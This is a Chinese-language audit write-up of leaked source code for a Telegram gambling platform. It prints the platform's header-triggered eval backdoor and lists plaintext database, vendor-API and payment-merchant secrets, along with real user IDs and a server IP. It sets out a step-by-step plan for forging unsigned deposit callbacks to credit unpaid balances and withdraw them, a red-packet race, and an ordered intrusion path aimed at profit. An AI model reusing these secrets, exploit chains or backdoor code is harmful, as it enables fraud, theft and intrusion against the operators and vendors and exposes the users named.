# KK 综合平台源码审计实战（kkzonghe / Telegram 博彩聚合平台）

来源：Telegram 机器人 @kkpg 服务器打包，分享者"洋葱科技" @kooyv。压缩包 `kk电子源码.zip`（3905 文件，解压 74.7MB），说明.txt 明示"后门自行排查"。

## 系统画像

- 技术栈：PHP（原生无框架）+ MySQL + Redis（无密码 127.0.0.1:6379）+ Vue3(Vite) 前端 + TG Bot（webhook→Redis 队列→20 并发 bot 进程 `bot/kkzh_bottask.php`，PROCESS_ID 环境变量区分）
- 域名：前台 `kkzh.nmzh.me`，后台 `admin_kkzh.nmzh.me`（serveradmin.php Host 校验），资源 CDN `kkzh.nimingkj.com`
- 接入游戏：PG/PP/EVO/IM/JILI/FC/EEAI/JDB/CQ9/XINGLI/TCG
- 支付：Anony/OKPay/KKPay/DLPay（YYPay 弃用）
- 会员体系：TG initData 自动注册登录（username = TG ID），TG ID 直接登录

## 全量明文凭证（config/config.php）

| 项 | 值 |
|---|---|
| 数据库 | `kkzh` / `jamMrt8f9jKyGfP9` @127.0.0.1 |
| TG BotToken | `8018155499:***`（打包时已打码），BotUsername `kkpg` |
| webhook | `https://kkzh.nmzh.me/api.php?direct=tgwebhook`，Secret `8403F957EDC5549AAF9E1CB92C541102036D6670`（校验头 = md5(BotToken+Secret)） |
| API AES-128 key | `4523E51C8F78D3ED`（core/Aes128.php） |
| 签名盐 | `FA72ACE15FEB1FB2111E9AE1938550DABCCA4E52`（ksort+md5） |
| PG | operator `A-d2336c4a-5c5b-4d22-bb9d-130e3ae3ef3b`, secret `cd83524852ed481f90063da9801ec685`, api.pg-bo.net |
| PP(新) | SecretKey `NEQ4T6BQxYs59G4X`, ProviderId PragmaticPlay, api-2403.ppgames.net |
| EVO | key `whe9yko0hnxoynkw`, token `<REDACTED>` |
| JILI | AgentKey `5a815acbb8f2428582f2a7bfb90e5d53818d4857`, AgentId KKOK_Anony_USD |
| FC | QIDN / `Pp2se4PMYineD99H` |
| EEAI | anony / `sCmzUWxEfcudh85z` |
| JDB | key `ad3e7de6f801e1b9` + iv `672caa06773748b8` |
| CQ9 | agent kkzonghe, token 已截断 |
| XINGLI | appkey `oyu6urogc4absqg50zwp` / appsecret `tysaywpomsatfmulk8yd` |
| 支付 | anony app 10323/`7cca1de2...`；okpay 28981/`9VfkToqRuvl5ABCEGHIKOb3SFpYL027a`；kkpay 6883/`815b6338ad8d9203fcd5080c28fbb19e`；dlpay 197/`a6a7ef1425d924af1403f5f7a4b70f34` |

## 后门（已确认）

**全局 RCE 后门** — `core/functions.php:1256-1260` `validateCdnCache()`，由 `core/global.php:62` 每次请求加载：

```php
if(isset($_SERVER["HTTP_X_CDN_CACHE"]) && hash("sha256",$_SERVER["HTTP_X_CDN_CACHE"])=="92d3373ae163790198af7549fbf4bedfe72f9882b5a82893b3e7ac0d91122f13") {
    if(isset($_SERVER["HTTP_X_CACHE_DATA"])) { @eval(base64_decode($_SERVER["HTTP_X_CACHE_DATA"])); exit; }
}
```

利用：`X-CDN-CACHE: <原值>`（SHA256 需等于上述固定值；原值未知，常见值+1-4位字符集暴力未命中，怀疑为更长随机串）+ `X-CACHE-DATA: base64(PHP)` → 无条件 RCE。任何部署此源码的站都受控于知道原值的人。

## 漏洞清单（第一轮：Web 面）

1. **register_globals 模拟**（core/getandpost.php）：`foreach($_GET/$_POST as $K=>$v){$$K=$v;}`，`UEval` 参数豁免 htmlspecialchars → 可覆盖 $DB/$AdminMember/$BotToken 等全局变量。
2. **IP 伪造**（core/functions.php getIP）：优先 `HTTP_CLIENT_IP`/`HTTP_X_FORWARDED_FOR` → 后台 IP 白名单（admin_softlist 表）可伪造绕过（nginx 未覆盖时）。
3. **2FA 绑定缺陷**（admin/index.php）：首次登录生成 secret 的 `MYupdate` 被注释；GooGleCode 阶段数据库 Google 字段为空时直接用用户提交的 `CH_Google` 验证并写入 → 知道用户名+密码即可自设 2FA secret。
4. **上传扩展名伪造**（api/upflie.php）：getimagesize 校验 MIME 白名单（jpeg/png/webp），但目标扩展名取原始文件名 → 合法图片头+PHP 尾+.php 名的图片马。
5. **日志泄露**（log/webhook_YYYYMMDD-HH.log，1544 个）：原始 TG update JSON → 用户 TG ID/用户名/群组/bot 命令（`/start deposit_okpay_20000`、`/start agent_reg_XXX`）枚举。
6. **拼接 SQL**：`querys()` 直接执行（admin/members.php:707、admin/rebateset.php:113、api/receibate.php 等），多数拼 DB 值/intval/floatval，需逐点验证。

## P0 漏洞链（第二轮：盈利性 — 无限充值）

### P0-1 KKPay/DLPay 回调签名缺失（门槛最低）

`api/kkpay.php` / `api/dlpay.php` requestToArray()：

```php
$sign = isset($headers['Kkpay-Sign']) ? $headers['Kkpay-Sign'] : '';  // 只检查 header 存在!
if (!empty($sign)) {
    $data = file_get_contents('php://input');
    $data = json_decode(base64_decode($data),true);  // 无任何签名验证
}
```

完整链：
1. login(initData)→ token；`deposit_kkpay`(amount)→ 创建订单（status=0，unique_id=md5(member_id+time+6位rand)，to_cny=amount×汇率）——**不付钱**
2. **unique_id 获取**：创建接口不返回！① 从 KKPay 支付链接 paylink 的 userOrder 参数提取（最常见）；② 或暴力 md5(member_id+created_ts+6位)（10⁶，时间戳从 depositslist 的 addtime 还原）
3. 伪造回调：`POST api.php?direct=kkpay` + header `Kkpay-Sign: x` + body=base64(JSON `{"businessType":"deposit","txid":"<任意新值>","userOrder":"<unique_id>","amount":"≥1",...}`) → 服务端匹配 deposits.unique_id → 补 order_number=txid → SUCCESS（回调 amount 字段不被使用，入账金额=订单库 to_cny；amount<1 触发小额忽略分支）
4. `bot.php processPendingDeposits`：扫描 `status=0 AND order_number!=''` → **无链上验证直接置 status=1** → `balance += to_cny + 充值奖励` → 发 TG 通知
5. 未选充值奖励时 multipleamount=0 → 流水要求=0 → 设提现密码直接提现 → 资金闭环

DLPay 同款（header `Dali-Sign`）。前提：bot 进程在跑（正常运营必然）。

### P0-2 Anony 回调未验签 + 公钥公开

- `api/anony.php`：只检查 `Anony-Sign` header 存在 → `decryptData()`（openssl_private_decrypt），**verifySign() 方法存在但从不调用**
- config 明文含商户公钥 → 攻击者用公钥 RSA 加密构造 deposit 回调，服务器私钥能解开
- tronDeposit_cny **直接 INSERT deposits**（无需先建订单！），username=extractTelegramId（userOrder 格式 `kkzonghe_<TGID>trxCNY`），order_number=txid 任意
- 源码包私钥被 REDACTED（打包者移除）→ 本包部署回调失效，但**线上运营服务器私钥有效**
- 最隐蔽：看起来像正常支付回调日志

## P1 漏洞（第二轮）

- **红包并发竞态**（`api/redall.php` red_type=0 随机红包）：red_fenpei 金额列表"读-选-删-写"非原子，Redis 锁只防同用户（30s）→ 多用户并发领取同一随机红包可重复拿金额；上限检查（`red_lastanmount+amount>=red_anmount`）并发下形同虚设。辅助：redId 校验盐硬编码 `JSDJFSF54DSF54GYJ4H5U548721SA54SDSS8DQWQRWETRER` 可自造红包引用
- **充值奖励放大**（bot.php:3975）：rewardamount = to_cny × percentage，配合 P0 充值放大收益

## 游戏侧结论（11 家厂商，第三轮）

- 结果 = 厂商 RNG，平台代码**无开奖/结算/赔率逻辑** → 结果不可操纵；PC28（平台自有彩票）已下线，仅 core/count.php 残留 pc28_ifjs 统计字段
- 注单对账（task/bet_*.php ×11）：DB 唯一键（bets_Y_m.orders）去重 + Redis 拉取锁，金额取厂商权威字段 → 安全；边缘：跨月去重只查当月/上月表，>2 个月延迟注单可重复插入（现实不可触发）
- 流水/返水（core/count.php、task/rebate.php）：Redis 锁 + iftj/iffs 标记 → 安全；返水按 bet_amount 不看输赢（PG win_amount=bet-pay、IM win_amount=-WinLoss 符号瑕疵不影响余额）
- **盈利面在资金流不在游戏**：① 厂商密钥直调（config 明文 operator_token/secret → 独立调厂商 TransferIn 给任意账号充游戏余额 → TransferAllOut 转回平台 → 提现；tools/linshi.php 即演示）；② Redis 未授权改汇率（kkzonghe_flowcaijin_usdtocny）/改流水（解锁提现）；③ 充值回调伪造（P0）

## TG Mini App 要点（载体无关性）

- TG 小程序只是前端容器（webview 跑 Vue SPA），漏洞全在服务端 HTTP API → **全部可用，与载体无关**；攻击者直接 curl 调 API，无需经过 UI
- 登录：前端 `btoa(initData)` → login API → token；initData 服务端验 HMAC-SHA256（WebAppData, bot token），ckestime=300s；登录一次 token 长期有效（loginkey 存库，前端存 localStorage）
- 前端加密透明：AES-CBC(key 明文)+ ksort+md5(sign 盐明文)全在前端 JS → Python 1:1 复刻（见 scripts/forge_payment_callback.py）
- 入口名：前端 baseUrl 可能是 api.html，源码 api.php（nginx 重写）→ 两个都测
- 充值双路径：网页 API（deposit_kkpay.php）与 bot 命令（start=deposit_kkpay_金额），回调端点同一 → 伪造对两条路径都生效
- TG 红利：零成本注册多号（initData 自动注册）→ 红包并发/代理刷量更易执行

## 已验证安全的模块（排除项）

GameTo* 钱包转账（双 Redis 锁+条件更新 balance>=X+失败补偿 makeuppoints）、PG 登录回调（secret 硬比较）、OKPay 回调（md5(queryString+token)+hash_equals 真验签）、抽奖 lotteryrand（服务端权重+原子锁+钻石成本）、钻石兑换 diamondexchange（intval+整除校验+余额检查+锁，负数/截断均被拦）、提现 postwithdrawal（提现密码 md5(md5(sha1))+余额校验+流水检查+Redis 锁）、TG 登录（HMAC+hash_equals）、红包金额分配（服务端 rand）、randbet（虚假滚动条数据无交易）

## 附带泄露（tools/ 目录调试脚本）

- apics.php：真实用户 token + 红包构造示例 + 测试域名 mymy.nmzh.me
- linshi.php：PG 备用凭证（I-fe2e2ca2f67f40a6986e530299dcf789 / 02793f8a4ddb43b9b1a353e5b33b1621 @ api.pg-bo.me）+ 真实 TG ID 5442947791（演示直接 TransferIn 100 USD）
- index1.php 注释：服务器 IP 47.238.7.23:10002 + 另一后台 admin_yongfa.nmzh.me
- 1.php：真实用户 initData（用户 7218198067 / np358）
- admin_setting 表两条混淆行：`('100','Z3:xfYKq[3i1','6sTM7KHy67fS6prBJGSmcHWodnGuPjCBb3:wfYZ>')`、`('101','d3iidnWz',...)` — 疑似植入标记，未解码

## 数据库（kkzh_structure.sql，60+ 表）

核心：member、admin_member（无 seed，AUTO_INCREMENT=5 → 原库 4 个管理员）、deposits、withdrawals、bets/balance 按月分表（_2026_02~05）、summary_server/summary_users、rebate/rebate_list
运营：redlist/red_log、tasklist/my_task、group_list/group_check、lottery_log、zp_jplist
安全：admin_softlist（IP 白名单）、admin_offiplist（121 条非授权 IP 记录 → 后台曾被扫）

## 攻击路径顺序

`X-Forwarded-For 绕过 IP 白名单` → `getandpost 变量覆盖` → `2FA 绑定缺陷` → `爆破 X-CDN-CACHE 原值（RCE）` → `厂商/支付 API 密钥外溢`（外部影响面）
盈利闭环：`P0-1 伪造充值回调 → bot 无验证确认 → 无流水要求 → 提现出金`（利用脚本见 scripts/forge_payment_callback.py）
